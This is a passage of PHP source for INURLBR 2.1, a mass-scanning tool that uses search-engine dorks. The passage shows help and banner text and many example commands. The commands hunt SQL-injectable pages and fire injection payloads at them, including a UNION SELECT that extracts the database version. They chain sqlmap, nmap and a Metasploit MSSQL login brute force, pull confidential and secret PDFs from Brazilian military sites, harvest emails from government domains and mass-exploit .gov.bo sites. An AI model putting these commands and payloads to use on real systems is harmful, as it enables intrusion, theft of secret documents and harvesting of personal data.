 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Encrypt values in hex.
     Example: {$_SESSION["c1"]}hex({$_SESSION["c2"]}{value}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}hex({$_SESSION["c2"]}102030{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=hex({$_SESSION["c2"]}102030{$_SESSION["c1"]})'{$_SESSION["c0"]}

 {$_SESSION["c1"]}hex{$_SESSION["c0"]} Generate random values.
     Example: {$_SESSION["c1"]}random({$_SESSION["c2"]}{character_counter}{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}random({$_SESSION["c2"]}8{$_SESSION["c1"]}){$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get 'user?id=random({$_SESSION["c2"]}8{$_SESSION["c1"]})'{$_SESSION["c0"]}

");
}

function __info() {

    return system("command clear") . __getOut("
 {$_SESSION["c1"]}_____ _   _ ______ ____  
|_   _| \ | |  ____/ __ \ 
  | | |  \| | |__ | |  | |
  | | | . ` |  __|| |  | |
 _| |_| |\  | |   | |__| |
|_____|_| \_|_|    \____/
 
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current PHP version=>{$_SESSION["c1"]}[ " . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current script owner=>{$_SESSION["c1"]}[ " . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current uname=>{$_SESSION["c1"]}[ " . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}Current pwd=>{$_SESSION["c1"]}[ " . getcwd() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GRUPO  INURL BRASIL - PESQUISA AVANÇADA.
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}SCRIPT NAME: INURLBR 2.1
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}AUTOR:    Cleiton Pinheiro
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Nick:     Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Email:    inurlbr@gmail.com  
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Blog:     http://blog.inurl.com.br
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Twitter:  https://twitter.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Facebook: https://fb.com/InurlBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}GIT:      https://github.com/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Pastebin  https://pastebin.com/u/Googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PSS:      https://packetstormsecurity.com/user/googleinurl
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}YOUTUBE:  http://youtube.com/c/INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}PLUS:     http://google.com/+INURLBrasil
 {$_SESSION["c1"]}[*]{$_SESSION["c0"]}Version:  2.1

{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c16"]}NECESSARY FOR THE PROPER FUNCTIONING OF THE SCRIPT{$_SESSION["c0"]}
	
     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} LIB & CONFIG{$_SESSION["c0"]}

 * PHP Version         5.4.7
 * php5-curl           LIB
 * php5-cli            LIB   
 * cURL support        enabled
 * cURL Information    7.24.0
 * allow_url_fopen     On
 * permission          Reading & Writing
 * User                root privilege, or is in the sudoers group
 * Operating system    LINUX
 * Proxy random        TOR 
                
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}
 
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}PERMISSION EXECUTION: chmod +x inurlbr.php{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CURL: sudo apt-get install php5-curl{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING LIB PHP-CLI: sudo apt-get install php5-cli{$_SESSION["c0"]}
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033[0m
   {$_SESSION["c1"]}[+]{$_SESSION["c0"]} {$_SESSION["c16"]}INSTALLING PROXY TOR https://www.torproject.org/docs/debian.html.en{$_SESSION["c0"]}
   
{$_SESSION["c1"]}[-]-------------------------------------------------------------------------------{$_SESSION["c0"]}

     {$_SESSION["c1"]}[ - ]{$_SESSION["c16"]} COMMANDS SIMPLE SCRIPT{$_SESSION["c0"]}
   
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]} 
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:aspx?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'index of wp-content/uploads' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6,2,4 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'Index of /wp-content/uploads'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(confidencial) ext:pdf' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6 -t 2 --exploit-get {$_SESSION["c3"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'confidencial'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.mil.br intext:(secreto) ext:pdf' {$_SESSION["c1"]}-s save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}2 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}'?' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'secreto'{$_SESSION["c0"]}        
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:aspx (id|new)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q {$_SESSION["c2"]}1,6 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c2"]}\"?´'%270x27;\"{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'.new.php?new id' {$_SESSION["c1"]}-s {$_SESSION["c2"]}save.txt {$_SESSION["c1"]}-q 1,6,7,2,3 {$_SESSION["c1"]}-t {$_SESSION["c2"]}1 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}'+UNION+ALL+SELECT+1,concat(0x3A3A4558504C4F49542D5355434553533A3A,@@version),3,4,5;' {$_SESSION["c1"]}-a {$_SESSION["c2"]}'::EXPLOIT-SUCESS::'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'new.php?id=' {$_SESSION["c1"]}-s {$_SESSION["c2"]}teste.txt  {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27  {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
   
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:pt inurl:aspx (id|q)' {$_SESSION["c1"]}-s {$_SESSION["c2"]}bruteforce.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}?´0x27 {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'msfcli auxiliary/scanner/mssql/mssql_login RHOST={$_SESSION["c9"]}_TARGETIP_ {$_SESSION["c2"]}MSSQL_USER=inurlbr MSSQL_PASS_FILE=/home/pedr0/Documentos/passwords E'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:br inurl:id & inurl:php' {$_SESSION["c1"]}-s {$_SESSION["c2"]}get.txt {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?´'%270x27;\" {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'python ../sqlmap/sqlmap.py -u \"{$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c2"]}\" --dbs'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:index.php?id=' {$_SESSION["c1"]}-q 1,2,10 {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"'?´0x27'\" {$_SESSION["c1"]}-s {$_SESSION["c2"]}report.txt {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap -Pn -p 1-8080 --script http-enum --open {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]}'{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email' {$_SESSION["c1"]}-s {$_SESSION["c2"]}reg.txt -q 1  --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}emails.txt {$_SESSION["c1"]}-m{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br email (gmail|yahoo|hotmail) ext:txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}urls.txt {$_SESSION["c1"]}-u{$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:gov.bo' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.uk' {$_SESSION["c1"]}-s {$_SESSION["c2"]}uk.txt {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]} 'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)' {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}govs.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6 {$_SESSION["c0"]}
 
./inurlbr.php {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorksSqli.txt' {$_SESSION["c1"]}-s {$_SESSION["c2"]}sqli.txt {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]} 1,2,6  {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'   {$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
 
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
  
./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http
